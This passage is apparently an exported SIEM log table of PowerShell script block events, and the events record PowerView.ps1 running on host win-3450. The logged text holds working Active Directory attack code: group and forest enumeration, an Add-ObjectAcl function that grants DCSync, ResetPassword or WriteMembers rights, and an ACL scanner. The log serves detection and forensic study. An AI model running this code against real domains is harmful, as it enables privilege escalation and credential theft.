[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()        }    }}function Get-NetForest {<#    .SYNOPSIS        Returns a given forest object.    .PARAMETER Forest        The forest name to query for, defaults to the current domain.    .EXAMPLE            PS C:\> Get-NetForest -Forest external.domain#>    [CmdletBinding()]    param(        [Parameter(ValueFromPipeline=$True)]        [String]        $Forest    )    process {        if($Forest) {            $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $Forest)            try {                $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)            }            catch {                Write-Debug ""The specified forest $Forest does not exist, could not be contacted, or there isn't an existing trust.""                $Null            }        }        else {            # otherwise use the current forest            $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()        }        if($ForestObject) {            # get the SID of the forest root            $ForestSid = (New-Object System.Security.Principal.NTAccount($ForestObject.RootDomain,""krbtgt"")).Translate([System.Security.Principal.SecurityIdentifier]).Value            $Parts = $ForestSid -Split ""-""            $ForestSid = $Parts[0..$($Parts.length-2)] -join ""-""            $ForestObject | Add-Member NoteProperty 'RootDomainSid' $ForestSid            $ForestObject        }    }}function Get-NetForestDomain {<#    .SYNOPSIS        Return all domains for a given forest.    .PARAMETER Forest        The forest name to query domain for.    .PARAMETER Domain        Return domains that match this term/wildcard.    .EXAMPLE        PS C:\> Get-NetForestDomain    .EXAMPLE        PS C:\> Get-NetForestDomain -Forest external.local#>    [CmdletBinding()]    p","-","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:39:32.304","3,728"
"EnV3ypsB8mE-0EyZ6H-n","-",logs,"-","-","-",powershell,"-","-","-","-","Execute a Remote Command","-","C:\Users\michael.ascot\downloads\PowerView.ps1","win-3450","Creating Scriptblock text (10 of 26):X""    .PARAMETER PageSize        The PageSize to set for the LDAP searcher object.    .EXAMPLE        PS C:\> Get-NetGroup                Returns the current groups in the domain.    .EXAMPLE        PS C:\> Get-NetGroup -GroupName *admin*                Returns all groups with ""admin"" in their group name.    .EXAMPLE        PS C:\> Get-NetGroup -Domain testing -FullData                Returns full group data objects in the 'testing' domain#>    [CmdletBinding()]    param(        [Parameter(ValueFromPipeline=$True)]        [String]        $GroupName = '*',        [String]        $SID,        [String]        $UserName,        [String]        $Filter,        [String]        $Domain,                [String]        $DomainController,                [String]        $ADSpath,        [Switch]        $AdminCount,        [Switch]        $FullData,        [Switch]        $RawSids,        [ValidateRange(1,10000)]         [Int]        $PageSize = 200    )    begin {        $GroupSearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize    }    process {        if($GroupSearcher) {            if($AdminCount) {                Write-Verbose ""Checking for adminCount=1""                $Filter += ""(admincount=1)""            }            if ($UserName) {                # get the raw user object                $User = Get-ADObject -SamAccountName $UserName -Domain $Domain -DomainController $DomainController -ReturnRaw -PageSize $PageSize                # convert the user to a directory entry                $UserDirectoryEntry = $User.GetDirectoryEntry()                # cause the cache to calculate the token groups for the user                $UserDirectoryEntry.RefreshCache(""tokenGroups"")                $UserDirectoryEntry.TokenGroups | Foreach-Object {                    # convert the token group sid                    $GroupSid = (New-Object System.Security.Principal.SecurityIdentifier($_,0)).Value                                        # ignore the built in users and default domain user group                    if(!($GroupSid -match '^S-1-5-32-545|-513$')) {                        if($FullData) {                            Get-ADObject -SID $GroupSid -PageSize $PageSize                        }                        else {                            if($RawSids) {                                $GroupSid                            }                            else {                                Convert-SidToName $GroupSid                            }                        }                    }                }            }            else {                if ($SID) {                    $GroupSearcher.filter = ""(&(objectCategory=group)(objectSID=$SID)$Filter)""                }                else {                    $GroupSearcher.filter = ""(&(objectCategory=group)(name=$GroupName)$Filter)""                }                            $GroupSearcher.FindAll() | Where-Object {$_} | ForEach-Object {                    # if we're returning full data objects                    if ($FullData) {                        # convert/process the LDAP fields for each result                        Convert-LDAPProperty -Properties $_.Properties                    }                    else {                        # otherwise we're just returning the group name                        $_.properties.samaccountname                    }                }            }        }    }}function Get-NetGroupMember {<#    .SYNOPSIS        This function users [ADSI] and LDAP to query the current AD context        or trusted domain for users in a specified group. If no GroupName is        specified, it defaults to querying the ""Domain Admins"" group.        This is a replacement for ""net group 'name' /domain""    .PARAMETER GroupName        The group name to query for users.    .PARAMETER SID        The Group SID to query for users. If not given, it defaults to 512 ""Domain Admins""    .PARAMETER Filter        A customized ldap filter string to use, e.g. ""(description=*admin*)""    .PARAMETER Domain        The domain to query for group users, defaults to the current domain.    .PARAMETER DomainController        Domain controller to reflect LDAP queries through.    .PARAMETER ADSpath        The LDAP source to search through, e.g. ""LDAP://OU=secret,DC=testlab,DC=local""        Useful for OU queries.    .PARAMETER FullData        Switch. Returns full data objects instead of just group/users.    .PARAMETER Recurse        Switch. If the group member is a group, recursively try to query its members as well.    .PARAMETER UseMatchingRule        Switch. Use LDAP_MATCHING_RULE_IN_CHAIN in the LDAP search query when -Recurse is specified.        Much faster than manual recursion, but doesn't reveal cross-domain groups.    .PARAMETER PageSize        The PageSize to set for the LDAP searcher object.    .EXAMPLE        PS C:\> Get-NetGroupMember                Returns the usernames that of members of the ""Domain Admins"" domain group.    .EXAMPLE        PS C:\> Get-NetGroupMember -Domain testing -GroupName ""Power Users""                Returns the usernames that of members of the ""Power Users"" group in the 'testing' domain.    .LINK        http://www.powershellmagazine.com/2013/05/23/pstip-retrieve-group-membership-of-an-active-directory-group-recursively/#>    [CmdletBinding()]    param(        [Parameter(ValueFromPipeline=$True)]        [String]        $GroupName,        [String]        $SID,        [String]        $Domain = (Get-NetDomain).Name,        [String]        $DomainController,        [String]        $ADSpath,        [Switch]        $FullData,        [Switch]        $Recurse,        [Switch]        $UseMatchingRule,        [ValidateRange(1,10000)]         [Int]        $PageSize = 200    )    begin {        # so this isn't repeated if users are passed on the pipeline        $GroupSearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize        if(!$DomainController) {            $DomainController = ((Get-NetDomain).PdcRoleOwner).Name        }    }    process {        if ($GroupSearcher) {            if ($Recurse -and $UseMatchingRule) {                # resolve the group to a distinguishedname                if ($GroupName) {                    $Group = Get-NetGroup -GroupName $GroupName -Domain $Domain -FullData -PageSize $PageSize                }                elseif ($SID) {                    $Group = Get-NetGroup -SID $SID -Domain $Domain -FullData -PageSize $PageSize                }                else {                    # default to domain admins                    $SID = (Get-DomainSID -Domain $Domain) + ""-512""                    $Group = Get-NetGroup -SID $SID -Domain $Domain -FullData -PageSize $PageSize                }                $GroupDN = $Group.distinguishedname                $GroupFoundName = $Group.name                if ($GroupDN) {                    $GroupSearcher.filter = ""(&(samAccountType=805306368)(memberof:1.2.840.113556.1.4.1941:=$GroupDN)$Filter)""                    $GroupSearcher.PropertiesToLoad.AddRange(('distinguishedName','samaccounttype','lastlogon','lastlogontimestamp','dscorepropagationdata','objectsid','whencreated','badpasswordtime','accountexpires','iscriticalsystemobject','name','usnchanged','objectcategory','description','codepage','instancetype','countrycode','distinguishedname','cn','admincount','logonhours','objectclass','logoncount','usncreated','useraccountcontrol','objectguid','primarygroupid','lastlogoff','samaccountname','badpwdcount','whenchanged','memberof','pwdlastset','adspath'))                    $Members = $GroupSearcher.FindAll()                    $GroupFoundName = $GroupName                }                else {                    Write-Error ""Unable to find Group""                }            }            else {                if ($GroupName) {                    $GroupSearcher.filter = ""(&(objectCategory=group)(name=$GroupName)$Filter)""                }                elseif ($SID) {                    $GroupSearcher.filter = ""(&(objectCategory=group)(objectSID=$SID)$Filter)""                }                else {                    # default to domain admins                    $SID = (Get-DomainSID -Domain $Domain) + ""-512""                    $GroupSearcher.filter = ""(&(objectCategory=group)(objectSID=$SID)$Filter)""                }                $GroupSearcher.FindAll() | ForEach-Object {                    try {                        if (!($_) -or !($_.properties) -or !($_.properties.name)) { continue }                        $GroupFoundName = $_.properties.name[0]                        $Members = @()                        if ($_.properties.member.Count -eq 0) {                            $Finished = $False                            $Bottom = 0                            $Top = 0                            while(!$Finished) {                                $Top = $Bottom + 1499                                $MemberRange=""member;range=$Bottom-$Top""                                $Bottom += 1500                                $GroupSearcher.PropertiesToLoad.Clear()                                [void]$GroupSearcher.PropertiesToLoad.Add(""$MemberRange"")                                try {                                    $Result = $GroupSearcher.FindOne()                                    if ($Result) {                                        $RangedProperty = $_.Properties.PropertyNames -like ""member;range=*""                                        $Results = $_.Properties.item($RangedProperty)                                        if ($Results.count -eq 0) {                                            $Finished = $True                                        }                                        else {                                            $Results | ForEach-Object {                                                $Members += $_                                            }                                        }                                    }                                    else {                                        $Finished = $True                                    }                                }                                 catch [System.Management.Automation.MethodInvocationException] {                                    $Finished = $True                                }                            }                        }                         else {                            $Members = $_.properties.member                        }                    }                     catch {                        Write-Verbose $_                    }                }            }            $Members | Where-Object {$_} | ForEach-Object {                # if we're doing the LDAP_MATCHING_RULE_IN_CHAIN recursion                if ($Recurse -and $UseMatchingRule) {                    $Properties = $_.Properties                }                 else {                    if($DomainController) {                        $Result = [adsi]""LDAP://$DomainController/$_""                    }                    else {                        $Result = [adsi]""LDAP://$_""                    }                    if($Result){                        $Properties = $Result.Properties                    }                }                if($Properties) {                    if($Properties.samaccounttype -notmatch '805306368') {                        $IsGroup = $True                    }                    else {                        $IsGroup = $False                    }                    if ($FullData) {                        $GroupMember = Convert-LDAPProperty -Properties $Properties                    }                    else {                        $GroupMember = New-Object PSObject                    }                    $GroupMember | Add-Member Noteproperty 'GroupDomain' $Domain                    $GroupMember | Add-Member Noteproperty 'GroupName' $GroupFoundName                    try {                        $MemberDN = $Properties.distinguishedname[0]                                                # extract the FQDN from the Distinguished Name                        $MemberDomain = $MemberDN.subString($MemberDN.IndexOf(""DC="")) -replace 'DC=','' -replace ',','.'                    }                    catch {                        $MemberDN = $Null                        $MemberDomain = $Null                    }                    if ($Properties.samaccountname) {                        # forest users have the samAccountName set                        $MemberName = $Properties.samaccountname[0]                    }                     else {                        # external trust users have a SID, so convert it                        try {                            $MemberName = Convert-SidToName $Properties.cn[0]                        }                        catch {                            # if there's a problem contacting the domain to resolve the SID                            $MemberName = $Properties.cn                        }                    }                                        if($Properties.objectSid) {                        $MemberSid = ((New-Object System.Security.Principal.SecurityIdentifier $Properties.objectSid[0],0).Value)                    }                    else {                        $MemberSid = $Null                    }                    $GroupMember | Add-Member Noteproperty 'MemberDomain' $MemberDomain                    $GroupMember | Add-Member Noteproperty 'MemberName' $MemberNScriptBlock ID: 1a3d4436-4580-464d-b9fd-fe2a68b82ecaPath: C:\Users\michael.ascot\downloads\PowerView.ps1","-","-","-","X""    .PARAMETER PageSize        The PageSize to set for the LDAP searcher object.    .EXAMPLE        PS C:\> Get-NetGroup                Returns the current groups in the domain.    .EXAMPLE        PS C:\> Get-NetGroup -GroupName *admin*                Returns all groups with ""admin"" in their group name.    .EXAMPLE        PS C:\> Get-NetGroup -Domain testing -FullData                Returns full group data objects in the 'testing' domain#>    [CmdletBinding()]    param(        [Parameter(ValueFromPipeline=$True)]        [String]        $GroupName = '*',        [String]        $SID,        [String]        $UserName,        [String]        $Filter,        [String]        $Domain,                [String]        $DomainController,                [String]        $ADSpath,        [Switch]        $AdminCount,        [Switch]        $FullData,        [Switch]        $RawSids,        [ValidateRange(1,10000)]         [Int]        $PageSize = 200    )    begin {        $GroupSearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize    }    process {        if($GroupSearcher) {            if($AdminCount) {                Write-Verbose ""Checking for adminCount=1""                $Filter += ""(admincount=1)""            }            if ($UserName) {                # get the raw user object                $User = Get-ADObject -SamAccountName $UserName -Domain $Domain -DomainController $DomainController -ReturnRaw -PageSize $PageSize                # convert the user to a directory entry                $UserDirectoryEntry = $User.GetDirectoryEntry()                # cause the cache to calculate the token groups for the user                $UserDirectoryEntry.RefreshCache(""tokenGroups"")                $UserDirectoryEntry.TokenGroups | Foreach-Object {                    # convert the token group sid                    $GroupSid = (New-Object System.Security.Principal.SecurityIdentifier($_,0)).Value                                        # ignore the built in users and default domain user group                    if(!($GroupSid -match '^S-1-5-32-545|-513$')) {                        if($FullData) {                            Get-ADObject -SID $GroupSid -PageSize $PageSize                        }                        else {                            if($RawSids) {                                $GroupSid                            }                            else {                                Convert-SidToName $GroupSid                            }                        }                    }                }            }            else {                if ($SID) {                    $GroupSearcher.filter = ""(&(objectCategory=group)(objectSID=$SID)$Filter)""                }                else {                    $GroupSearcher.filter = ""(&(objectCategory=group)(name=$GroupName)$Filter)""                }                            $GroupSearcher.FindAll() | Where-Object {$_} | ForEach-Object {                    # if we're returning full data objects                    if ($FullData) {                        # convert/process the LDAP fields for each result                        Convert-LDAPProperty -Properties $_.Properties                    }                    else {                        # otherwise we're just returning the group name                        $_.properties.samaccountname                    }                }            }        }    }}function Get-NetGroupMember {<#    .SYNOPSIS        This function users [ADSI] and LDAP to query the current AD context        or trusted domain for users in a specified group. If no GroupName is        specified, it defaults to querying the ""Domain Admins"" group.        This is a replacement for ""net group 'name' /domain""    .PARAMETER GroupName        The group name to query for users.    .PARAMETER SID        The Group SID to query for users. If not given, it defaults to 512 ""Domain Admins""    .PARAMETER Filter        A customized ldap filter string to use, e.g. ""(description=*admin*)""    .PARAMETER Domain        The domain to query for group users, defaults to the current domain.    .PARAMETER DomainController        Domain controller to reflect LDAP queries through.    .PARAMETER ADSpath        The LDAP source to search through, e.g. ""LDAP://OU=secret,DC=testlab,DC=local""        Useful for OU queries.    .PARAMETER FullData        Switch. Returns full data objects instead of just group/users.    .PARAMETER Recurse        Switch. If the group member is a group, recursively try to query its members as well.    .PARAMETER UseMatchingRule        Switch. Use LDAP_MATCHING_RULE_IN_CHAIN in the LDAP search query when -Recurse is specified.        Much faster than manual recursion, but doesn't reveal cross-domain groups.    .PARAMETER PageSize        The PageSize to set for the LDAP searcher object.    .EXAMPLE        PS C:\> Get-NetGroupMember                Returns the usernames that of members of the ""Domain Admins"" domain group.    .EXAMPLE        PS C:\> Get-NetGroupMember -Domain testing -GroupName ""Power Users""                Returns the usernames that of members of the ""Power Users"" group in the 'testing' domain.    .LINK        http://www.powershellmagazine.com/2013/05/23/pstip-retrieve-group-membership-of-an-active-directory-group-recursively/#>    [CmdletBinding()]    param(        [Parameter(ValueFromPipeline=$True)]        [String]        $GroupName,        [String]        $SID,        [String]        $Domain = (Get-NetDomain).Name,        [String]        $DomainController,        [String]        $ADSpath,        [Switch]        $FullData,        [Switch]        $Recurse,        [Switch]        $UseMatchingRule,        [ValidateRange(1,10000)]         [Int]        $PageSize = 200    )    begin {        # so this isn't repeated if users are passed on the pipeline        $GroupSearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize        if(!$DomainController) {            $DomainController = ((Get-NetDomain).PdcRoleOwner).Name        }    }    process {        if ($GroupSearcher) {            if ($Recurse -and $UseMatchingRule) {                # resolve the group to a distinguishedname                if ($GroupName) {                    $Group = Get-NetGroup -GroupName $GroupName -Domain $Domain -FullData -PageSize $PageSize                }                elseif ($SID) {                    $Group = Get-NetGroup -SID $SID -Domain $Domain -FullData -PageSize $PageSize                }                else {                    # default to domain admins                    $SID = (Get-DomainSID -Domain $Domain) + ""-512""                    $Group = Get-NetGroup -SID $SID -Domain $Domain -FullData -PageSize $PageSize                }                $GroupDN = $Group.distinguishedname                $GroupFoundName = $Group.name                if ($GroupDN) {                    $GroupSearcher.filter = ""(&(samAccountType=805306368)(memberof:1.2.840.113556.1.4.1941:=$GroupDN)$Filter)""                    $GroupSearcher.PropertiesToLoad.AddRange(('distinguishedName','samaccounttype','lastlogon','lastlogontimestamp','dscorepropagationdata','objectsid','whencreated','badpasswordtime','accountexpires','iscriticalsystemobject','name','usnchanged','objectcategory','description','codepage','instancetype','countrycode','distinguishedname','cn','admincount','logonhours','objectclass','logoncount','usncreated','useraccountcontrol','objectguid','primarygroupid','lastlogoff','samaccountname','badpwdcount','whenchanged','memberof','pwdlastset','adspath'))                    $Members = $GroupSearcher.FindAll()                    $GroupFoundName = $GroupName                }                else {                    Write-Error ""Unable to find Group""                }            }            else {                if ($GroupName) {                    $GroupSearcher.filter = ""(&(objectCategory=group)(name=$GroupName)$Filter)""                }                elseif ($SID) {                    $GroupSearcher.filter = ""(&(objectCategory=group)(objectSID=$SID)$Filter)""                }                else {                    # default to domain admins                    $SID = (Get-DomainSID -Domain $Domain) + ""-512""                    $GroupSearcher.filter = ""(&(objectCategory=group)(objectSID=$SID)$Filter)""                }                $GroupSearcher.FindAll() | ForEach-Object {                    try {                        if (!($_) -or !($_.properties) -or !($_.properties.name)) { continue }                        $GroupFoundName = $_.properties.name[0]                        $Members = @()                        if ($_.properties.member.Count -eq 0) {                            $Finished = $False                            $Bottom = 0                            $Top = 0                            while(!$Finished) {                                $Top = $Bottom + 1499                                $MemberRange=""member;range=$Bottom-$Top""                                $Bottom += 1500                                $GroupSearcher.PropertiesToLoad.Clear()                                [void]$GroupSearcher.PropertiesToLoad.Add(""$MemberRange"")                                try {                                    $Result = $GroupSearcher.FindOne()                                    if ($Result) {                                        $RangedProperty = $_.Properties.PropertyNames -like ""member;range=*""                                        $Results = $_.Properties.item($RangedProperty)                                        if ($Results.count -eq 0) {                                            $Finished = $True                                        }                                        else {                                            $Results | ForEach-Object {                                                $Members += $_                                            }                                        }                                    }                                    else {                                        $Finished = $True                                    }                                }                                 catch [System.Management.Automation.MethodInvocationException] {                                    $Finished = $True                                }                            }                        }                         else {                            $Members = $_.properties.member                        }                    }                     catch {                        Write-Verbose $_                    }                }            }            $Members | Where-Object {$_} | ForEach-Object {                # if we're doing the LDAP_MATCHING_RULE_IN_CHAIN recursion                if ($Recurse -and $UseMatchingRule) {                    $Properties = $_.Properties                }                 else {                    if($DomainController) {                        $Result = [adsi]""LDAP://$DomainController/$_""                    }                    else {                        $Result = [adsi]""LDAP://$_""                    }                    if($Result){                        $Properties = $Result.Properties                    }                }                if($Properties) {                    if($Properties.samaccounttype -notmatch '805306368') {                        $IsGroup = $True                    }                    else {                        $IsGroup = $False                    }                    if ($FullData) {                        $GroupMember = Convert-LDAPProperty -Properties $Properties                    }                    else {                        $GroupMember = New-Object PSObject                    }                    $GroupMember | Add-Member Noteproperty 'GroupDomain' $Domain                    $GroupMember | Add-Member Noteproperty 'GroupName' $GroupFoundName                    try {                        $MemberDN = $Properties.distinguishedname[0]                                                # extract the FQDN from the Distinguished Name                        $MemberDomain = $MemberDN.subString($MemberDN.IndexOf(""DC="")) -replace 'DC=','' -replace ',','.'                    }                    catch {                        $MemberDN = $Null                        $MemberDomain = $Null                    }                    if ($Properties.samaccountname) {                        # forest users have the samAccountName set                        $MemberName = $Properties.samaccountname[0]                    }                     else {                        # external trust users have a SID, so convert it                        try {                            $MemberName = Convert-SidToName $Properties.cn[0]                        }                        catch {                            # if there's a problem contacting the domain to resolve the SID                            $MemberName = $Properties.cn                        }                    }                                        if($Properties.objectSid) {                        $MemberSid = ((New-Object System.Security.Principal.SecurityIdentifier $Properties.objectSid[0],0).Value)                    }                    else {                        $MemberSid = $Null                    }                    $GroupMember | Add-Member Noteproperty 'MemberDomain' $MemberDomain                    $GroupMember | Add-Member Noteproperty 'MemberName' $MemberN","-","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:39:32.304","3,728"
"CHV3ypsB8mE-0EyZwX98","-",logs,"-","-","-",powershell,"-","-","-","-","Execute a Remote Command","-","C:\Users\michael.ascot\downloads\PowerView.ps1","win-3450","Creating Scriptblock text (7 of 26):UIDs, map them them to the resolved hash table                        $AclProperties = @{}                        $_.psobject.properties | ForEach-Object {                            if( ($_.Name -eq 'ObjectType') -or ($_.Name -eq 'InheritedObjectType') ) {                                try {                                    $AclProperties[$_.Name] = $GUIDS[$_.Value.toString()]                                }                                catch {                                    $AclProperties[$_.Name] = $_.Value                                }                            }                            else {                                $AclProperties[$_.Name] = $_.Value                            }                        }                        New-Object -TypeName PSObject -Property $AclProperties                    }                    else { $_ }                }            }            catch {                Write-Warning $_            }        }    }}function Add-ObjectAcl {<#    .SYNOPSIS        Adds an ACL for a specific active directory object.                AdminSDHolder ACL approach from Sean Metcalf (@pyrotek3)            https://adsecurity.org/?p=1906        ACE setting method adapted from https://social.technet.microsoft.com/Forums/windowsserver/en-US/df3bfd33-c070-4a9c-be98-c4da6e591a0a/forum-faq-using-powershell-to-assign-permissions-on-active-directory-objects.        'ResetPassword' doesn't need to know the user's current password        'WriteMembers' allows for the modification of group membership    .PARAMETER TargetSamAccountName        Target object name to filter for.            .PARAMETER TargetName        Target object name to filter for.    .PARAMETER TargetDistinguishedName        Target object distinguished name to filter for.    .PARAMETER TargetFilter        A customized ldap filter string to use to find a target, e.g. ""(description=*admin*)""    .PARAMETER TargetADSpath        The LDAP source for the target, e.g. ""LDAP://OU=secret,DC=testlab,DC=local""    .PARAMETER TargetADSprefix        Prefix to set for the target searcher (like ""CN=Sites,CN=Configuration"")    .PARAMETER PrincipalSID        The SID of the principal object to add for access.    .PARAMETER PrincipalName        The name of the principal object to add for access.    .PARAMETER PrincipalSamAccountName        The samAccountName of the principal object to add for access.    .PARAMETER Rights        Rights to add for the principal, ""All"",""ResetPassword"",""WriteMembers"",""DCSync""    .PARAMETER Domain        The domain to use for the target query, defaults to the current domain.    .PARAMETER DomainController        Domain controller to reflect LDAP queries through.    .PARAMETER PageSize        The PageSize to set for the LDAP searcher object.    .EXAMPLE        Add-ObjectAcl -TargetSamAccountName matt -PrincipalSamAccountName john        Grants 'john' all full access rights to the 'matt' account.    .EXAMPLE        Add-ObjectAcl -TargetSamAccountName matt -PrincipalSamAccountName john -Rights ResetPassword        Grants 'john' the right to reset the password for the 'matt' account.    .LINK        https://adsecurity.org/?p=1906                https://social.technet.microsoft.com/Forums/windowsserver/en-US/df3bfd33-c070-4a9c-be98-c4da6e591a0a/forum-faq-using-powershell-to-assign-permissions-on-active-directory-objects?forum=winserverpowershell#>    [CmdletBinding()]    Param (        [String]        $TargetSamAccountName,        [String]        $TargetName = ""*"",        [Alias('DN')]        [String]        $TargetDistinguishedName = ""*"",        [String]        $TargetFilter,        [String]        $TargetADSpath,        [String]        $TargetADSprefix,        [String]        [ValidatePattern('^S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+')]        $PrincipalSID,        [String]        $PrincipalName,        [String]        $PrincipalSamAccountName,        [String]        [ValidateSet(""All"",""ResetPassword"",""WriteMembers"",""DCSync"")]        $Rights = ""All"",        [String]        $RightsGUID,        [String]        $Domain,        [String]        $DomainController,        [ValidateRange(1,10000)]         [Int]        $PageSize = 200    )    begin {        $Searcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $TargetADSpath -ADSprefix $TargetADSprefix -PageSize $PageSize        if(!$PrincipalSID) {            $Principal = Get-ADObject -Domain $Domain -DomainController $DomainController -Name $PrincipalName -SamAccountName $PrincipalSamAccountName -PageSize $PageSize                        if(!$Principal) {                throw ""Error resolving principal""            }            $PrincipalSID = $Principal.objectsid        }        if(!$PrincipalSID) {            throw ""Error resolving principal""        }    }    process {        if ($Searcher) {            if($TargetSamAccountName) {                $Searcher.filter=""(&(samaccountname=$TargetSamAccountName)(name=$TargetName)(distinguishedname=$TargetDistinguishedName)$TargetFilter)""              }            else {                $Searcher.filter=""(&(name=$TargetName)(distinguishedname=$TargetDistinguishedName)$TargetFilter)""              }              try {                $Searcher.FindAll() | Where-Object {$_} | Foreach-Object {                    # adapted from https://social.technet.microsoft.com/Forums/windowsserver/en-US/df3bfd33-c070-4a9c-be98-c4da6e591a0a/forum-faq-using-powershell-to-assign-permissions-on-active-directory-objects                    $TargetDN = $_.Properties.distinguishedname                    $Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$PrincipalSID)                    $InheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] ""None""                    $ControlType = [System.Security.AccessControl.AccessControlType] ""Allow""                    $ACEs = @()                    if($RightsGUID) {                        $GUIDs = @($RightsGUID)                    }                    else {                        $GUIDs = Switch ($Rights) {                            # ResetPassword doesn't need to know the user's current password                            ""ResetPassword"" { ""00299570-246d-11d0-a768-00aa006e0529"" }                            # allows for the modification of group membership                            ""WriteMembers"" { ""bf9679c0-0de6-11d0-a285-00aa003049e2"" }                            # 'DS-Replication-Get-Changes' = 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2                            # 'DS-Replication-Get-Changes-All' = 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2                            # 'DS-Replication-Get-Changes-In-Filtered-Set' = 89e95b76-444d-4c62-991a-0facbeda640c                            #   when applied to a domain's ACL, allows for the use of DCSync                            ""DCSync"" { ""1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"", ""1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"", ""89e95b76-444d-4c62-991a-0facbeda640c""}                        }                    }                    if($GUIDs) {                        foreach($GUID in $GUIDs) {                            $NewGUID = New-Object Guid $GUID                            $ADRights = [System.DirectoryServices.ActiveDirectoryRights] ""ExtendedRight""                            $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity,$ADRights,$ControlType,$NewGUID,$InheritanceType                        }                    }                    else {                        # deault to GenericAll rights                        $ADRights = [System.DirectoryServices.ActiveDirectoryRights] ""GenericAll""                        $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity,$ADRights,$ControlType,$InheritanceType                    }                    Write-Verbose ""Granting principal $PrincipalSID '$Rights' on $($_.Properties.distinguishedname)""                    try {                        # add all the new ACEs to the specified object                        ForEach ($ACE in $ACEs) {                            Write-Verbose ""Granting principal $PrincipalSID '$($ACE.ObjectType)' rights on $($_.Properties.distinguishedname)""                            $Object = [adsi]($_.path)                            $Object.PsBase.ObjectSecurity.AddAccessRule($ACE)                            $Object.PsBase.commitchanges()                        }                    }                    catch {                        Write-Warning ""Error granting principal $PrincipalSID '$Rights' on $TargetDN : $_""                    }                }            }            catch {                Write-Warning ""Error: $_""            }        }    }}function Invoke-ACLScanner {<#    .SYNOPSIS        Searches for ACLs for specifable AD objects (default to all domain objects)        with a domain sid of > -1000, and have modifiable rights.        Thanks Sean Metcalf (@pyrotek3) for the idea and guidance.    .PARAMETER SamAccountName        Object name to filter for.            .PARAMETER Name        Object name to filter for.    .PARAMETER DistinguishedName        Object distinguished name to filter for.    .PARAMETER Filter        A customized ldap filter string to use, e.g. ""(description=*admin*)""         .PARAMETER ADSpath        The LDAP source to search through, e.g. ""LDAP://OU=secret,DC=testlab,DC=local""        Useful for OU queries.    .PARAMETER ADSprefix        Prefix to set for the searcher (like ""CN=Sites,CN=Configuration"")    .PARAMETER Domain        The domain to use for the query, defaults to the current domain.    .PARAMETER DomainController        Domain controller to reflect LDAP queries through.    .PARAMETER ResolveGUIDs        Switch. Resolve GUIDs to their display names.    .PARAMETER PageSize        The PageSize to set for the LDAP searcher object.    .EXAMPLE        PS C:\> Invoke-ACLScanner -ResolveGUIDs | Export-CSV -NoTypeInformation acls.csv        Enumerate all modifable ACLs in the current domain, resolving GUIDs to display         names, and export everything to a .csv#>    [CmdletBinding()]    Param (        [Parameter(ValueFromPipeline=$True)]        [String]        $SamAccountName,        [String]        $Name = ""*"",        [Alias('DN')]        [String]        $DistinguishedName = ""*"",        [String]        $Filter,        [String]        $ADSpath,        [String]        $ADSprefix,        [String]        $Domain,        [String]        $DomainController,        [Switch]        $ResolveGUIDs,        [ValidateRange(1,10000)]         [Int]        $PageSize = 200    )    # Get all domain ACLs with the appropriate parameters    Get-ObjectACL @PSBoundParameters | ForEach-Object {        # add in the translated SID for the object identity        $_ | Add-Member Noteproperty 'IdentitySID' ($_.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]).Value)        $_    } | Where-Object {        # check for any ACLs with SIDs > -1000        try {            [int]($_.IdentitySid.split(""-"")[-1]) -ge 1000        }        catch {}    } | Where-Object {        # filter for modifiable rights        ($_.ActiveDirectoryRights -eq ""GenericAll"") -or ($_.ActiveDirectoryRights -match ""Write"") -or ($_.ActiveDirectoryRights -match ""Create"") -or ($_.ActiveDirectoryRights -match ""Delete"") -or (($_.ActiveDirectoryRights -match ""ExtendedRight"") -and ($_.AccessControlType -eq ""Allow""))    }}function Get-GUIDMap {<#    .SYNOPSIS        Helper to build a hash table of [GUID] -> resolved names        Heavily adapted from http://blogs.technet.com/b/ashleymcglone/archive/2013/03/25/active-directory-ou-permissions-report-free-powershell-script-download.aspx    .PARAMETER Domain            The domain to use for the query, defaults to the current domain.    .PARAMETER DomainController            Domain controller to reflect LDAP queries through.    .PARAMETER PageSize        The PageSize to set for the LDAP searcher object.    .LINK        http://blogs.technet.com/b/ashleymcglone/archive/2013/03/25/active-directory-ou-permissions-report-free-powershell-script-download.aspx#>    [CmdletBinding()]    Param (        [String]        $Domain,        [String]        $DomainController,        [ValidateRange(1,10000)]         [Int]        $PageSize = 200    )    $GUIDs = @{'00000000-0000-0000-0000-000000000000' = 'All'}    $SchemaPath = (Get-NetForest).schema.name    $SchemaSearcher = Get-DomainSearcher -ADSpath $SchemaPath -DomainController $DomainController -PageSize $PageSize    if($SchemaSearcher) {        $SchemaSearcher.filter = ""(schemaIDGUID=*)""        try {            $SchemaSearcher.FindAll() | Where-Object {$_} | ForEach-Object {                # convert the GUID                $GUIDs[(New-Object Guid (,$_.properties.schemaidguid[0])).Guid] = $_.properties.name[0]            }        }        catch {            Write-Debug ""Error in building GUID map: $_""        }          }    $RightsSearcher = Get-DomainSearcher -ADSpath $SchemaPath.replace(""Schema"",""Extended-Rights"") -DomainController $DomainController -PageSize $PageSize    if ($RightsSearcher) {        $RightsSearcher.filter = ""(objectClass=controlAccessRight)""        try {            